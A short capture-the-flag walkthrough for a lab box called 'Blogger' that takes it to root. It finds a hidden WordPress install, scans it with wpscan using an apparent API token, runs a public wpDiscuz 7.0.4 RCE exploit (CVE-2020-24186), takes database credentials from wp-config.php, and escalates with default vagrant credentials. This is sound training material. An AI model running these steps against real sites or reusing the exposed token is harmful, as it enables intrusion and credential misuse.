# Blogger - Walkthrough

## 🧗 Initial Foothold

### 🌐 1. Enumeration
- Found **port 80** open.
- Browsed to `/assets/fonts/blog` and found a suspicious extension: **blog**.
- Accessed that path and landed on a **WordPress** website.

### 🔍 2. WPScan Enumeration
Used `wpscan` to enumerate users and plugins:
```bash
wpscan --url http://blogger.pg/assets/fonts/blog --api-token RrFUPiearf5qUNrioSvCtwDAz0h1OImtg5RfpTIRm4E -e u
```

- Found outdated plugin: **wpDiscuz 7.0.4**

### 💣 3. Exploiting wpDiscuz
- `searchsploit` showed:
  ```
  49967.py - WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
  ```
- Exploit failed — found working exploit on GitHub:
  [hev0x/CVE-2020-24186](https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE)

- Ran the exploit with:
  ```bash
  python3 wpDiscuz_RemoteCodeExec.py -u http://blogger.pg/assets/fonts/blog -p "/?p=17"
  ```
  (Chose an arbitrary page/post with comments enabled)

### 🗝️ 4. MySQL Credentials
- Extracted from standard `wp-config.php`:
  ```
  root : sup3r_s3cr3t
  ```

---

## ⚙️ Privilege Escalation

### 🧪 Tried:
- `linpeas.sh`
- MySQL login using credentials from wp-config

### ✅ Success:
- Logged in as user: `vagrant:vagrant`
- Ran:
  ```bash
  sudo su root
  ```
- Got root shell.

---

## 🧠 Notes

- Don't ignore random folders like `/assets/fonts/`.
- Always check `wp-config.php` for creds.
- If public exploits fail, search GitHub — someone usually fixed them.

